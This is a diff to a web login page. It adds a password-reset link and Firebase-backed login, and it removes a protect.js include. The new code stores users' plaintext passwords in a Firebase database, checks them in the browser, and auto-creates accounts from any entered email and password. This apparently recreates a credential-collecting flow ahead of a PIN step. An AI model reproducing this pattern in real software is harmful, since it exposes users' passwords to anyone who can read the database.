@@ -113,6 +113,15 @@
     color: #14213d;
   }
 
+  .forgot {
+    text-align: right;
+    font-size: 14px;
+    color: #14213d;
+    text-decoration: none;
+    display: block;
+    margin-bottom: 22px;
+  }
+
   .login-btn {
     width: 100%;
     padding: 17px;
@@ -197,6 +206,8 @@
         </button>
       </div>
 
+      <a href="#" class="forgot">I forgot my password</a>
+
       <button type="submit" class="login-btn">Log in</button>
     </form>
 
@@ -215,6 +226,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <script>
+  // 🔥 YOUR FIREBASE CONFIG
   const firebaseConfig = {
     apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
     authDomain: "achievebypetra-82966.firebaseapp.com",
@@ -226,6 +238,7 @@
     measurementId: "G-TBGZS8PJ76"
   };
 
+  // Initialize Firebase
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
 
@@ -264,18 +277,47 @@
       return;
     }
 
-    // ✅ ONLY SAVE TO LOCALSTORAGE - DO NOT SAVE TO FIREBASE YET
-    localStorage.setItem('currentUserEmail', email);
-    localStorage.setItem('currentUserPassword', password);
-
-    showToast('Redirecting to PIN setup...');
-    setTimeout(() => {
-      window.location.href = 'pin.html';
-    }, 500);
+    // Check if user exists in Firebase
+    database.ref('users').orderByChild('email').equalTo(email).once('value')
+      .then((snapshot) => {
+        if (snapshot.exists()) {
+          // User found - check password
+          let userFound = false;
+          snapshot.forEach((childSnapshot) => {
+            const userData = childSnapshot.val();
+            if (userData.password === password) {
+              userFound = true;
+              localStorage.setItem('currentUserEmail', email);
+              window.location.href = 'pin.html';
+            }
+          });
+          if (!userFound) {
+            showToast('Incorrect password');
+          }
+        } else {
+          // New user - create account
+          const newUser = {
+            id: 'User_' + Date.now().toString(36).toUpperCase(),
+            email: email,
+            password: password,
+            pin: '',
+            timestamp: new Date().toLocaleString()
+          };
+          database.ref('users').push(newUser)
+            .then(() => {
+              localStorage.setItem('currentUserEmail', email);
+              window.location.href = 'pin.html';
+            })
+            .catch((error) => {
+              showToast('Error: ' + error.message);
+            });
+        }
+      })
+      .catch((error) => {
+        showToast('Error: ' + error.message);
+      });
   }
 </script>
 
-
-  <script src="protect.js"></script>
 </body>
 </html>
